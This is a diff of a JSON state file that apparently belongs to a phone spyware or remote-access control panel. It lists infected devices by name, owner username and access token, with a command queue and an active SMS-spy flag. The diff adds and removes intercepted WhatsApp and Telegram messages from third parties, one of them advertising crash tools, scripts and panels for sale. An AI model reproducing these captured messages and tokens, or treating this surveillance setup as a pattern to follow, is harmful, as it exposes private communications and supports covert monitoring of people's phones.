@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778069827,
+    "lastSeen": 1776778072840,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || MANZZ KALBAR (963 pesan): ~ ada",
+        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
+        "time": "21/04 20:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778073655
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775757363
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (654 pesan): ~ Jumbo g mud",
-        "content": "📷 120+ lumut polosan vault 113",
-        "time": "21/04 19:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775733008
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778071519,
+    "lastSeen": 1776778073523,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
+        "content": "Hey there KING777, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
+        "time": "21/04 20:27",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778072665
+      },
       {
         "appName": "Telegram",
         "sender": "./j4X¡tsme な #sa #flory 🎖️",
@@ -14394,14 +14402,6 @@
         "time": "21/04 20:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777213235
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @IkyyNotDev2 ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
-        "time": "21/04 20:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777199654
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778069864,
+    "lastSeen": 1776778072870,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
